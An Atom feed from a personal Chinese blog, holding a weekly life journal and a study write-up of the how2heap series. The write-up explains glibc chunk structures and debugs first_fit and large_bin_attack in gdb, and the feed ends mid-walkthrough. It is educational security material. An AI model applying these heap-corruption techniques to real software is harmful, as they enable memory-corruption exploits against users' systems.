<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>M@tr1xの日常</title>
  
  
  <link href="https://www.blog.hackerjerry.top/atom.xml" rel="self"/>
  
  <link href="https://www.blog.hackerjerry.top/"/>
  <updated>2021-06-21T06:38:22.518Z</updated>
  <id>https://www.blog.hackerjerry.top/</id>
  
  <author>
    <name>M@tr1x</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>生活周报-June-14-to-20</title>
    <link href="https://www.blog.hackerjerry.top/2021/06/17/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-14-to-20_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/06/17/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-14-to-20_new/</id>
    <published>2021-06-17T09:19:24.000Z</published>
    <updated>2021-06-21T06:38:22.518Z</updated>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>神州十二号发射成功</li><li>翻译泰斗许渊冲逝世，享年 100 岁</li><li>中国人首次进入自己的国际空间站</li><li>回形针被爆员工和美国军方有利益往来。</li></ol><p>​</p><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>最近的大作业、实验好多，快要撑不住了。</li><li>最近的夏令营好多，好紧张。</li><li>端午节收到了小雷的粽子，第一次吃咸粽子！一个云腿的一个菌子的，好下饭！</li><li>前一阵子气温很高（接近 40 度），然后这个周下了一周的雨。</li><li>最近掉头发有点多了，从今天，6.17，周四起，11：45 上床，不管还有什么任务没有完成，上床睡觉！</li></ol><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><ol><li><a href="https://www.cnblogs.com/aspirant/p/8902285.html">HashMap, HashTable，HashSet,TreeMap 的时间复杂度 注意数组链表 增删改查的时间复杂度都不相同(阿里)</a></li><li><a href="https://www.jianshu.com/p/7495fad83877">哈希表详解</a></li><li><a href="https://blog.csdn.net/hguisu/article/details/7880288">海量数据处理算法—Bit-Map</a></li><li><a href="http://www.ruanyifeng.com/blog/2015/06/poisson-distribution.html">泊松分布和指数分布</a></li><li><a href="http://www.ruanyifeng.com/blog/2018/09/hash-collision-and-birthday-attack.html">哈希碰撞与生日攻击</a></li></ol><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><p>觉醒年代<br>我的青铜时代 x 罗翔<br>我的青铜时代 x 陈佩斯</p><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><p>下面是许渊冲许老爷子的一些话，人生哲理，愿君谨记：</p><ol><li><strong>生命不是你活过了多少日子，而是你记住了多少日子。我不管活多久，认真享受每一天，做自己喜欢的事情就好。</strong></li><li><strong>不要与人争，找到自己的热爱。</strong></li></ol><hr><ol start="3"><li>最好的爱是两个人彼此做个伴，不要束缚，不要缠绕，不要占有，不要渴望从对方的身上挖掘到意义，而应该是我们两个人并排坐在一起，看看这个落寞的人间。</li><li>林徽因的<em>《别丢掉》</em></li></ol><p>别丢掉这一把过往的热情，<br>现在流水似的，<br>轻轻在幽冷的山泉底，<br>在黑夜，在松林，<br>叹息似的渺茫，<br>你仍要保存着那真！<br>一样是明月，一样是隔山灯火，<br>满天的星，<br>只有人不见，<br>梦似的挂起，<br>你向黑夜要回那一句话——你仍得相信山谷中留着那回音！</p><ol start="5"><li>人生很长，被人喜欢这件事，我不赶时间。</li></ol><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><ol><li>生成对抗网络 GAN</li><li>深度卷积神经网络进行虚假人脸识别-分别采用 MTCNN 架构、ResNet50 进行迁移学习</li><li>用 kali 进行无线安全实验，注意内置网卡无法识别，必须使用外置的无线网卡。</li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>许渊冲先生千古，他为世人留下了上百本译本。这是一位值得我一生去学习的先生、长者。<br>他天资聪颖，17 岁便入西南联大读书，文学造诣首屈一指。然而他却没有就此懈怠，反而一生笔耕不辍，为世人留下上百本传世佳品。<br>62 岁，老先生以“一年至少新译一本名著、出一本论文集、写一本散文集”的速度，酣畅创造。<br>86 岁，他被诊断患直肠癌，医生说，他最多只有 7 年时间。他反而照旧抓紧一切时间，翻译诗词和名著。试想，此般精神，几人能有？那是死亡的宣判啊，但许老爷子害怕了吗？抱怨了吗？放弃希望了吗？不，他没有，那团生命之火，还在尽情的燃烧着，只要希望不死，人就能拥有活下去的勇气。这难道不令人振奋吗，这难道不令人动容吗？把生命融入到自己的热爱里，即使是上天也会为之感动，许老活了下来，坚强的，用生命去创造。<br>90 岁高龄，他给自己制定的计划是“每天翻译 1000 字”，93 岁，他的工作目标是，翻译完莎士比亚全集，96 岁，他居然骑车出门赏月！不慎摔伤骨折，老先生依然云淡风轻，“要不是为了走这美的路，我就不会摔了，不过月光如水，还摔的挺美的”<br>人生百年，先生活得精彩。<br>先生的人生态度，值得我一生学习：<br>生老病死，世事浮沉，无改天真与疯狂。<br>“越向前走，越有光明的前途，每一个小时，都要快快活活。”<br>许老爷子一路走好。<br>​</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;时讯&quot;&gt;&lt;a href=&quot;#时讯&quot; class=&quot;headerlink&quot; title=&quot;时讯&quot;&gt;&lt;/a&gt;时讯&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;神州十二号发射成功&lt;/li&gt;
&lt;li&gt;翻译泰斗许渊冲逝世，享年 100 岁&lt;/li&gt;
&lt;li&gt;中国人首次进入自己的国际空间站&lt;/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>How2heap系列</title>
    <link href="https://www.blog.hackerjerry.top/2021/05/31/How2heap%E7%B3%BB%E5%88%97_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/05/31/How2heap%E7%B3%BB%E5%88%97_new/</id>
    <published>2021-05-31T03:51:02.000Z</published>
    <updated>2021-06-21T06:37:32.089Z</updated>
    
    <content type="html"><![CDATA[<p>tags: []<br>categories: []<br>cover: “”<br>​</p><hr><p>实验使用 wsl 进行，具体的 glibc 版本为 2.28，运行<code>/lib/x86_64-linux-gnu/libc.so.6</code>即可看到版本<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-1.png#clientId=u347f053a-7aac-4&from=paste&height=121&id=ubcbe185e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=241&originWidth=756&originalType=binary&size=264115&status=done&style=none&taskId=u396bde25-eab2-4a06-bb3b-c2811987e8d&width=378" alt="image.png"></p><a id="more"></a><h1 id="安装-pwngdb-pwndbg"><a href="#安装-pwngdb-pwndbg" class="headerlink" title="安装 pwngdb+pwndbg"></a>安装 pwngdb+pwndbg</h1><p>参考<a href="https://blog.csdn.net/weixin_43092232/article/details/105648769">https://blog.csdn.net/weixin_43092232/article/details/105648769</a><br>配置如下<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-2.png#clientId=u347f053a-7aac-4&from=paste&height=181&id=udbe3c4f1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=362&originWidth=534&originalType=binary&size=278719&status=done&style=none&taskId=u86b81336-450f-40db-a685-ef4ce0a2429&width=267" alt="image.png"></p><h1 id="how2heap-概述"><a href="#how2heap-概述" class="headerlink" title="how2heap 概述"></a>how2heap 概述</h1><p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-3.png#clientId=u347f053a-7aac-4&from=paste&height=328&id=u094da593&margin=%5Bobject%20Object%5D&name=image.png&originHeight=656&originWidth=1195&originalType=binary&size=115449&status=done&style=none&taskId=ua9828c89-666f-4095-af6d-4a8310c5693&width=597.5" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-4.png#clientId=u347f053a-7aac-4&from=paste&height=357&id=ued1b9be3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=714&originWidth=1202&originalType=binary&size=131426&status=done&style=none&taskId=u62e23b01-92b3-4bf2-9bf4-b40d8099d96&width=601" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-5.png#clientId=u347f053a-7aac-4&from=paste&height=324&id=udf398312&margin=%5Bobject%20Object%5D&name=image.png&originHeight=648&originWidth=1206&originalType=binary&size=141433&status=done&style=none&taskId=ueb73bcb6-30ef-4add-ac3a-64f6fa81b36&width=603" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-6.png#clientId=u347f053a-7aac-4&from=paste&height=89&id=uca37f774&margin=%5Bobject%20Object%5D&name=image.png&originHeight=178&originWidth=1199&originalType=binary&size=41410&status=done&style=none&taskId=u510b02f8-c5d4-432b-a698-2fe503733f1&width=599.5" alt="image.png"></p><h1 id="切换-glibc-版本"><a href="#切换-glibc-版本" class="headerlink" title="切换 glibc 版本"></a>切换 glibc 版本</h1><p>不到万不得已，不用<code>apt-get install libc-bin=2.24-11+deb9u1 libc6=2.24-11+deb9u1</code></p><blockquote><p>这个版本是通过</p></blockquote><p>glibc 是动态链接库<br>所以可以指定程序的任意 glibc 版本哦，ubuntu 的 glibc-all-in-one 也可以直接用在 debian 上的！<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-7.png#clientId=u347f053a-7aac-4&from=paste&height=238&id=u630ec27f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=476&originWidth=1052&originalType=binary&size=450517&status=done&style=none&taskId=u55f4ef69-a967-440a-977e-c93ae10ee37&width=526" alt="image.png"><br>然后参考<br><a href="https://blog.csdn.net/qq_45595732/article/details/115385790">https://blog.csdn.net/qq_45595732/article/details/115385790</a><br><a href="https://www.yuque.com/kaleido76/pwn/fn4432">https://www.yuque.com/kaleido76/pwn/fn4432</a><br><a href="https://blog.csdn.net/juluwangriyue/article/details/108617283">https://blog.csdn.net/juluwangriyue/article/details/108617283</a><br>并运行类似<br><code>patchelf --set-interpreter /mnt/f/桌面/大三下/软件安全/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so overlapping1</code></p><p><code>patchelf --set-rpath /mnt/f/桌面/大三下/软件安全/glibc-all-in-one/libs/2.23-0ubuntu3_amd64 overlapping1 </code><br>​</p><p>大功告成<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-8.png#clientId=u347f053a-7aac-4&from=paste&height=175&id=ud788b965&margin=%5Bobject%20Object%5D&name=image.png&originHeight=349&originWidth=1285&originalType=binary&size=367384&status=done&style=none&taskId=u5b431fbb-b35d-4966-ad37-114dee52ab6&width=642.5" alt="image.png"></p><h1 id="first-fit-2-28"><a href="#first-fit-2-28" class="headerlink" title="first_fit-2.28"></a>first_fit-2.28</h1><p>这里没有任何攻击，说的是 glibc 分配内存的方式是最先适应算法，空闲块按地址递增的顺序排列，只要求分配空间大小小于该空闲空间大小，就可以分配。实例中给了分配两个 chunk，大小分别为 512 和 256，大于 fastbin，然后写入数据并释放第一个 512chunk，释放的 chunk 在 unsorted bin 之中，之后再分配 500 字节。此时由于 glibc 机制，直接在 unsorted bin 中找到并将其分割，一部分给用户，另一部分保留，所以第三个 chunk 指针与之前第一个 chunk 的相同。<br>我们首先编译<code>gcc first_fit.c -o first -g</code><br>然后<code>gdb first</code>进行调试<br>首先，输入 start<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-9.png#clientId=u347f053a-7aac-4&from=paste&height=345&id=ud7ff854b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=651&originWidth=1122&originalType=binary&size=1125083&status=done&style=none&taskId=u865c97c4-9a62-4c88-9ec7-fb5a1836f15&width=595" alt="image.png"><br>然后查看堆内存<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-10.png#clientId=u347f053a-7aac-4&from=paste&height=56&id=ua939020c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=85&originWidth=393&originalType=binary&size=47039&status=done&style=none&taskId=u8d8fb7a1-4131-4495-a082-a96510f4dc6&width=259.5" alt="image.png"><br>可以看到还是没有的<br>然后 n 单步运行过 13 行，再次运行 heap，可以看到<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-11.png#clientId=u347f053a-7aac-4&from=paste&height=439&id=udab41a45&margin=%5Bobject%20Object%5D&name=image.png&originHeight=878&originWidth=1160&originalType=binary&size=1557884&status=done&style=none&taskId=u232dd3dc-7d9b-4606-9589-d112211794b&width=580" alt="image.png"><br>即第一个 a 的地址就是 0x8005250，然后我们继续分配 b<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-12.png#clientId=u347f053a-7aac-4&from=paste&height=222&id=uf4233992&margin=%5Bobject%20Object%5D&name=image.png&originHeight=443&originWidth=501&originalType=binary&size=323156&status=done&style=none&taskId=u60f56a96-0f5d-4938-80fd-aa9847763cb&width=250.5" alt="image.png"><br>可以发现 b 的地址是 0x8005770<br>而输出的数据是：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-13.png#clientId=u347f053a-7aac-4&from=paste&height=29&id=u0a63667d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=57&originWidth=321&originalType=binary&size=26195&status=done&style=none&taskId=u605230af-8d93-4b13-b34e-467e78437e4&width=160.5" alt="image.png"><br>这是因为我们知道 chunk 指针返回的是 mem 数据部分，chunk 在使用时的数据结构如下图：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">    An allocated chunk looks like <span class="keyword">this</span>:</span><br><span class="line">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    |             User data starts here...                          .</span><br><span class="line">    .                                                               .</span><br><span class="line">    .             (malloc_usable_size() bytes)                      .</span><br><span class="line">    .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    |             (size of chunk, but used <span class="keyword">for</span> application data)    |</span><br><span class="line">    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    |             Size of next chunk, in bytes                |A|<span class="number">0</span>|<span class="number">1</span>|</span><br><span class="line">    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中 chunk 定义的结构体如下：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>每个字段的具体的解释如下</p><ul><li><strong>prev_size</strong>, 如果该 chunk 的<strong>物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）</strong>是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。**这里的前一 chunk 指的是较低地址的 chunk **。</li><li><strong>size</strong> ，该 chunk 的大小，大小必须是 2 _ SIZE_SZ 的整数倍。如果申请的内存大小不是 2 _ SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示<ul><li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li><li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</li><li>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li></ul></li><li><strong>fd，bk</strong>。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下<ul><li>fd 指向下一个（非物理相邻）空闲的 chunk</li><li>bk 指向上一个（非物理相邻）空闲的 chunk</li><li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li></ul></li><li><strong>fd_nextsize， bk_nextsize</strong>，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。<ul><li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适 chunk 时挨个遍历。</strong></li></ul></li></ul><p>也就是说 malloc 返回的指针就是 chunk 的 fd 指针处，返回内存指针地址-0x10 是 chunk 块的真正头部。<br>这个时候我们可以查看以下两个 chunk 的结构：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-14.png#clientId=u347f053a-7aac-4&from=paste&height=39&id=u3578e819&margin=%5Bobject%20Object%5D&name=image.png&originHeight=78&originWidth=568&originalType=binary&size=60756&status=done&style=none&taskId=ud82be738-496f-4ff0-8b81-3c5a2fd229c&width=284" alt="image.png"><br>验证了我们的想法</p><blockquote><p>GDB 调试查看 Chunk 内存的时候，在 32 位系统的时候用 w（四字节 32 位），在 64 位系统的时候用 g（八字节 64 位）</p></blockquote><p>这时候我们往 a 的内存里面写入了”this is A!”的数据<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-15.png#clientId=u347f053a-7aac-4&from=paste&height=297&id=u2a9dd95c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=594&originWidth=951&originalType=binary&size=779596&status=done&style=none&taskId=u7c309d88-ed9c-4395-af94-51e0ef3120c&width=475.5" alt="image.png"><br>查看指针处数据<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-16.png#clientId=u347f053a-7aac-4&from=paste&height=40&id=uc43258b2&name=image.png&originHeight=80&originWidth=557&originalType=binary&size=61038&status=done&style=none&taskId=u36a0855c-611f-4636-8b65-a085361d73f&width=278.5" alt="image.png"><br>写入的数据就是上述字符串的 ASCII 码<br>当我们执行 free(a)释放 a 的内存块后，可以发现 a 先被放入了 unsortedbin 中，且 fd 指针和 bk 指针都指向了 main_arena<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-17.png#clientId=u347f053a-7aac-4&from=paste&height=471&id=uaab4248c&name=image.png&originHeight=941&originWidth=1113&originalType=binary&size=1596503&status=done&style=none&taskId=u46c0ff91-6ad9-4fbc-b7d0-fe90583f478&width=556.5" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-18.png#clientId=u347f053a-7aac-4&from=paste&height=225&id=u3f41a094&margin=%5Bobject%20Object%5D&name=image.png&originHeight=449&originWidth=864&originalType=binary&size=548857&status=done&style=none&taskId=u1a73c58c-a933-4d02-afde-ce7d7e95359&width=432" alt="image.png"><br>执行 c = malloc(0x500)，发现 c 分配到的内存块就是原来 a 分配到的内存块<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-19.png#clientId=u347f053a-7aac-4&from=paste&height=457&id=u07255dc9&name=image.png&originHeight=913&originWidth=954&originalType=binary&size=1290624&status=done&style=none&taskId=u8044fb4e-a813-4d6d-8367-2d0ae72e4ac&width=477" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-20.png#clientId=u347f053a-7aac-4&from=paste&height=27&id=u1ec3e24f&name=image.png&originHeight=53&originWidth=341&originalType=binary&size=30323&status=done&style=none&taskId=u1c7f382b-fb27-4d54-a074-30f5ab0390c&width=170.5" alt="image.png"><br>在 glibc-2.28 中，内存块全部分配，不在中 unsorted bin 保留<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-21.png#clientId=u347f053a-7aac-4&from=paste&height=229&id=uc4dc40e2&name=image.png&originHeight=458&originWidth=457&originalType=binary&size=297581&status=done&style=none&taskId=u10848018-20f0-4fd5-9087-0a157da04fb&width=228.5" alt="image.png"><br>然后在写入”This is C!”后查看内存情况<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-22.png#clientId=u347f053a-7aac-4&from=paste&height=322&id=uc4014290&margin=%5Bobject%20Object%5D&name=image.png&originHeight=644&originWidth=1129&originalType=binary&size=1108386&status=done&style=none&taskId=ucf59ceba-350e-4979-b446-a6239d8e756&width=564.5" alt="image.png"><br>可以发现和从之前的 0x41 变成了 0x43，说明从 A 变成了 C，然后继续执行<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-23.png#clientId=u347f053a-7aac-4&from=paste&height=30&id=u83f5467d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=59&originWidth=573&originalType=binary&size=52360&status=done&style=none&taskId=ue3b48849-bd89-4ac8-85de-3f0052f6e91&width=286.5" alt="image.png"><br>这说明这里其实存在一个漏洞：free 掉之后没有把指针置 0，造成一个 UAF(use after free)漏洞。就是 a 已经 free 掉之后又重新把那块地址分配回来再编辑会把 a 所指向的地址的内容也编辑了(也就是这个时候 a 跟 c 指向的是同一内存地址)。<br>修补：free 掉 a 之后，让 a 再指向 null。</p><h1 id="large-bin-attack-2-23"><a href="#large-bin-attack-2-23" class="headerlink" title="large_bin_attack-2.23"></a>large_bin_attack-2.23</h1><p>程序运行结果如下：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-24.png#clientId=u38185df4-f4d6-4&from=paste&height=409&id=u01dce496&margin=%5Bobject%20Object%5D&name=image.png&originHeight=817&originWidth=1905&originalType=binary&size=1486851&status=done&style=none&taskId=u795c39c6-fa0c-4eb5-bdbd-b2f34b0802f&width=952.5" alt="image.png"><br>该技术可用于修改任意地址的值，例如栈上的变量 stack_var1 和 stack_var2。在实践中常常作为其他漏洞利用的前奏，例如在 fastbin attack 中用于修改全局变量 global_max_fast 为一个很大的值。<br>首先我们分配 chunk p1, p2 和 p3，并且在它们之间插入其他的 chunk 以防止在释放时被合并。此时的内存布局如下：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">2</span>gx &amp;stack_var1</span><br><span class="line"><span class="number">0x7ffffffed9d0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x00000000080079b0</span></span><br><span class="line">pwndbg&gt; x/<span class="number">8</span>gx p1<span class="number">-6</span></span><br><span class="line"><span class="number">0x8006fe0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8006ff0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007000</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000431</span> &lt;-- p1</span><br><span class="line"><span class="number">0x8007010</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">8</span>gx p2<span class="number">-6</span></span><br><span class="line"><span class="number">0x8007440</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007450</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007460</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000511</span>  &lt;-- p2</span><br><span class="line"><span class="number">0x8007470</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">8</span>gx p3<span class="number">-6</span></span><br><span class="line"><span class="number">0x8007980</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007990</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x80079a0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000511</span>  &lt;-- p3</span><br><span class="line"><span class="number">0x80079b0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">8</span>gx p3+(<span class="number">0x510</span>/<span class="number">8</span>)<span class="number">-2</span></span><br><span class="line"><span class="number">0x8007eb0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000020151</span>  &lt;-- top</span><br><span class="line"><span class="number">0x8007ec0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007ed0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007ee0</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>然后依次释放掉 p1 和 p2，这两个 free chunk 将被放入 unsorted bin<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-25.png#clientId=u38185df4-f4d6-4&from=paste&height=426&id=u15aba304&name=image.png&originHeight=852&originWidth=688&originalType=binary&size=355625&status=done&style=none&taskId=u6ad399c3-0c6c-40b5-b103-1c88c38db82&width=344" alt="image.png"><br>内存布局即：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">8</span>gx p1<span class="number">-2</span></span><br><span class="line"><span class="number">0x8007000</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000431</span>  &lt;-- p1 [be freed]</span><br><span class="line"><span class="number">0x8007010</span>:      <span class="number">0x00007fffff3f3b78</span>      <span class="number">0x0000000008007460</span></span><br><span class="line"><span class="number">0x8007020</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007030</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">8</span>gx p2<span class="number">-2</span></span><br><span class="line"><span class="number">0x8007460</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000511</span>  &lt;-- p2 [be freed]</span><br><span class="line"><span class="number">0x8007470</span>:      <span class="number">0x0000000008007000</span>      <span class="number">0x00007fffff3f3b78</span></span><br><span class="line"><span class="number">0x8007480</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8007490</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>类似这样<img src= "/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622799357459-3e0b24c7-1a0a-4b1d-a824-ac169d300988.png#clientId=u38185df4-f4d6-4&from=paste&height=262&id=u8d85b49e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=392&originWidth=906&originalType=binary&size=50371&status=done&style=none&taskId=u3f890383-beb1-48e0-ac59-759732b834b&width=605" alt="image.png"><br>接下来随便 malloc 